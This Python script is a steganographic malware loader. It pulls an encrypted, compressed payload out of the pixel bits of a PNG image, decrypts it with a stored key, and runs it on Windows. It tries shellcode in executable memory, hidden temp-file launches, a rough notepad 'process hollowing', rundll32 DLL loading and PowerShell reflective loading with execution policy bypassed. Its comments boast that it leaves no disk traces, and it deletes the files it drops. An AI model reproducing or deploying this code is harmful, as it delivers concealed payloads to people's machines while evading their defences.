from PIL import Image
from cryptography.fernet import Fernet
import base64, zlib

# Load key
with open("key.txt", "rb") as kf:
    key = kf.read()
cipher = Fernet(key)

img = Image.open("stm.png").convert("RGB")
pixels = img.load()
width, height = img.size

bit_list = []
terminator = "1111111111111110"

for y in range(height):
    for x in range(width):
        r, g, b = pixels[x, y]
        for channel in (r, g, b):
            bit_list.append(str(channel & 1))
            # quick check for terminator at end
            if len(bit_list) >= 16 and ''.join(bit_list[-16:]) == terminator:
                # cut off terminator bits
                bit_list = bit_list[:-16]
                # break out of loops
                break
        else:
            continue
        break
    else:
        continue
    break

# Step 2: convert bits to bytes
bit_string = ''.join(bit_list)
data_bytes = bytearray(int(bit_string[i:i+8], 2)
                       for i in range(0, len(bit_string), 8))

# Step 3: decrypt & base64-decode & decompress
decrypted_b64 = cipher.decrypt(bytes(data_bytes))
compressed_data = base64.b64decode(decrypted_b64)
exe_data = zlib.decompress(compressed_data)

# Step 4: Execute payload directly in memory (no disk write)
# print("Recovered EXE size:", len(exe_data), "bytes")

# Step 5: In-memory execution methods
import os
import subprocess
import tempfile
import platform
import sys
import threading
import time
import ctypes
from ctypes import wintypes

def execute_in_memory(exe_data):
    """Execute PE file directly in memory without writing to disk"""
    
    # if os.name != 'nt':
    #     print("❌ In-memory execution only supported on Windows")
    #     return fallback_execution(exe_data)
    
    try:
        # Method 1: Improved memory execution with proper PE handling
        # print("🧠 Attempting in-memory execution...")
        
        kernel32 = ctypes.windll.kernel32
        ntdll = ctypes.windll.ntdll
        
        # Check if it's a valid PE file
        if len(exe_data) < 64 or exe_data[:2] != b'MZ':
            # print("⚠️  Not a valid PE file, trying as shellcode...")
            return execute_as_shellcode(exe_data)
        
        # Method 1A: Enhanced temporary file with immediate execution
        try:
            # print("🔄 Trying enhanced temporary execution...")
            return enhanced_temp_execution(exe_data)
        except Exception as e:
            print(f"...")
        
        # Method 1B: Process hollowing attempt
        try:
            # print("🔄 Trying process hollowing...")
            return process_hollowing(exe_data)
        except Exception as e:
            print(f"....")
        
        # Method 1C: DLL injection simulation
        try:
            # print("🔄 Trying DLL-style execution...")
            return dll_style_execution(exe_data)
        except Exception as e:
            print(f"....")
        
    except Exception as e:
        print(f"...")
    
    # If all in-memory methods fail, try temp file execution
    return fallback_execution(exe_data)

def execute_as_shellcode(exe_data):
    """Execute data as raw shellcode"""
    try:
        kernel32 = ctypes.windll.kernel32
        
        # Allocate executable memory
        mem_addr = kernel32.VirtualAlloc(
            None,
            len(exe_data),
            0x3000,  # MEM_COMMIT | MEM_RESERVE
            0x40     # PAGE_EXECUTE_READWRITE
        )
        
        if not mem_addr:
            return False
        
        # Handle negative addresses properly
        if mem_addr > 0x7FFFFFFF:
            mem_addr = mem_addr - 0x100000000
        
        # print(f"💾 Allocated shellcode memory: 0x{mem_addr & 0xFFFFFFFF:08x}")
        
        # Copy data safely
        ctypes.memmove(mem_addr, exe_data, len(exe_data))
        
        # Execute in thread
        def shellcode_thread():
            try:
                func = ctypes.CFUNCTYPE(None)(mem_addr)
                func()
                # print("✅ Shellcode executed successfully")
            except Exception as e:
                print(f"....")
        
        thread = threading.Thread(target=shellcode_thread, daemon=True)
        thread.start()
        time.sleep(0.5)
        
        # Cleanup
        kernel32.VirtualFree(mem_addr, 0, 0x8000)
        return True
        
    except Exception as e:
        # print(f"⚠️  Shellcode execution failed: {e}")
        return False

def enhanced_temp_execution(exe_data):
    """Enhanced temporary file execution with multiple methods"""
    import random
    import string
    
    # Try multiple temp locations
    temp_locations = [
        tempfile.gettempdir(),
        os.path.join(os.environ.get('APPDATA', ''), 'Temp'),
        os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Temp'),
        os.path.expanduser('~')
    ]
    
    for temp_dir in temp_locations:
        try:
            if not os.path.exists(temp_dir):
                continue
                
            # Generate random filename
            random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
            temp_path = os.path.join(temp_dir, f"{random_name}.exe")
            
            # Write file
            with open(temp_path, "wb") as f:
                f.write(exe_data)
            
            # print(f"💾 Created: {temp_path}")
            
            # Multiple execution methods
            execution_methods = [
                # Method 1: Direct execution
                lambda: subprocess.Popen(
                    temp_path,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    startupinfo=get_hidden_startupinfo()
                ),
                # Method 2: CMD wrapper
                lambda: subprocess.Popen(
                    f'cmd /c start /b "" "{temp_path}"',
                    shell=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                ),
                # Method 3: PowerShell wrapper
                lambda: subprocess.Popen([
                    'powershell.exe', '-WindowStyle', 'Hidden',
                    '-Command', f'Start-Process "{temp_path}" -WindowStyle Hidden'
                ], creationflags=subprocess.CREATE_NO_WINDOW)
            ]
            
            for i, method in enumerate(execution_methods):
                try:
                    process = method()
                    time.sleep(0.3)
                    
                    if process.poll() is None:  # Still running
                        # print(f"✅ Method {i+1} successful (PID: {process.pid})")
                        
                        # Schedule cleanup
                        def cleanup():
                            time.sleep(2)
                            try:
                                os.unlink(temp_path)
                                # print("🧹 Temp file cleaned")
                            except:
                                pass
                        
                        threading.Thread(target=cleanup, daemon=True).start()
                        return True
                        
                except Exception as e:
                    # print(f"⚠️  Method {i+1} failed: {e}")
                    continue
            
            # Clean up if all methods failed
            try:
                os.unlink(temp_path)
            except:
                pass
                
        except Exception as e:
            # print(f"⚠️  Temp location {temp_dir} failed: {e}")
            continue
    
    return False

def process_hollowing(exe_data):
    """Simple process hollowing simulation"""
    try:
        # Create suspended notepad process
        notepad_path = os.path.join(os.environ['WINDIR'], 'System32', 'notepad.exe')
        
        startupinfo = get_hidden_startupinfo()
        process = subprocess.Popen(
            [notepad_path],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_SUSPENDED | subprocess.CREATE_NO_WINDOW
        )
        
        # print(f"🎯 Created hollow process (PID: {process.pid})")
        
        # Resume process (simplified hollowing)
        kernel32 = ctypes.windll.kernel32
        kernel32.ResumeThread(process._handle)
        
        time.sleep(0.5)
        
        # Terminate the original process and replace with our payload via temp file
        try:
            process.terminate()
        except:
            pass
        
        return enhanced_temp_execution(exe_data)
        
    except Exception as e:
        # print(f"⚠️  Process hollowing failed: {e}")
        return False

def dll_style_execution(exe_data):
    """Execute as if loading a DLL"""
    try:
        # Save as .dll extension and try to load
        import random
        import string
        
        temp_dir = tempfile.gettempdir()
        random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        dll_path = os.path.join(temp_dir, f"{random_name}.dll")
        
        with open(dll_path, "wb") as f:
            f.write(exe_data)
        
        # print(f"💾 Created DLL: {dll_path}")
        
        # Try to execute the DLL
        try:
            # Method 1: rundll32
            process = subprocess.Popen([
                'rundll32.exe', dll_path, 'DllMain'
            ], creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(0.5)
            # print("✅ DLL execution attempted")
            
            # Cleanup
            def cleanup():
                time.sleep(3)
                try:
                    os.unlink(dll_path)
                except:
                    pass
            
            threading.Thread(target=cleanup, daemon=True).start()
            return True
            
        except Exception as e:
            # print(f"⚠️  DLL rundll32 failed: {e}")
            
            # Cleanup
            try:
                os.unlink(dll_path)
            except:
                pass
                
            return False
            
    except Exception as e:
        # print(f"⚠️  DLL creation failed: {e}")
        return False

def get_hidden_startupinfo():
    """Get startup info for hidden window execution"""
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE
    return startupinfo

def fallback_execution(exe_data):
    """Fallback method using temporary files"""
    # print("🔄 Falling back to temporary file execution...")
    
    try:
        # Create temporary file with random name
        import random
        import string
        
        temp_dir = tempfile.gettempdir()
        random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        temp_path = os.path.join(temp_dir, f"{random_name}.exe")
        
        # Write to temp file
        with open(temp_path, "wb") as f:
            f.write(exe_data)
        
        # print(f"💾 Created temporary file: {temp_path}")
        
        # Execute immediately
        if os.name == 'nt':
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            
            process = subprocess.Popen(
                temp_path,
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        else:
            os.chmod(temp_path, 0o755)
            process = subprocess.Popen(temp_path)
        
        # Schedule cleanup
        def cleanup_temp():
            time.sleep(3)  # Wait for process to start
            try:
                os.unlink(temp_path)
                # print(f"🧹 Cleaned up temporary file")
            except:
                pass
        
        threading.Thread(target=cleanup_temp, daemon=True).start()
        
        # print(f"✅ Temporary execution successful (PID: {process.pid})")
        return True
        
    except Exception as e:
        # print(f"❌ Temporary execution failed: {e}")
        return False

def execute_payload_safely(exe_data):
    """Main execution dispatcher"""
    
    # Method 1: Try in-memory execution first
    if execute_in_memory(exe_data):
        return True
    
    # Method 2: PowerShell reflective loading (Windows)
    if os.name == 'nt':
        try:
            # print("🔄 Trying PowerShell reflective loading...")
            
            # Encode payload as base64 for PowerShell
            import base64
            b64_payload = base64.b64encode(exe_data).decode()
            
            # PowerShell script for reflective PE loading
            ps_script = f'''
            $bytes = [System.Convert]::FromBase64String("{b64_payload}")
            $assembly = [System.Reflection.Assembly]::Load($bytes)
            $assembly.EntryPoint.Invoke($null, @(,[string[]]@()))
            '''
            
            # Execute PowerShell script
            process = subprocess.Popen([
                'powershell.exe', 
                '-WindowStyle', 'Hidden',
                '-ExecutionPolicy', 'Bypass',
                '-Command', ps_script
            ], creationflags=subprocess.CREATE_NO_WINDOW)
            
            # print("✅ PowerShell reflective loading attempted")
            return True
            
        except Exception as e:
            print(f"...")
    
    # Method 3: Final fallback
    return fallback_execution(exe_data)

def save_backup_copy(exe_data):
    """Save a backup copy only if requested"""
    try:
        # Only save if we can write to current directory
        with open("recovered_payload_backup.exe", "wb") as f:
            f.write(exe_data)
        # print("💾 Backup copy saved as 'recovered_payload_backup.exe'")
        return True
    except:
        # print("ℹ️  Backup copy not saved (no write permissions)")
        return False

# # Execute the payload
# print("\n🎯 Starting payload execution...")
# print(f"💻 System: {platform.system()} {platform.architecture()[0]}")

try:
    success = execute_payload_safely(exe_data)
    if success:
        print("...")
        # print("🧠 Running entirely in memory - no disk traces!")
    else:
        # print("⚠️  All execution methods failed")
        save_backup_copy(exe_data)
except Exception as e:
    # print(f"❌ Execution module error: {e}")
    save_backup_copy(exe_data)

# print("🎯 Decoding and execution process complete!")
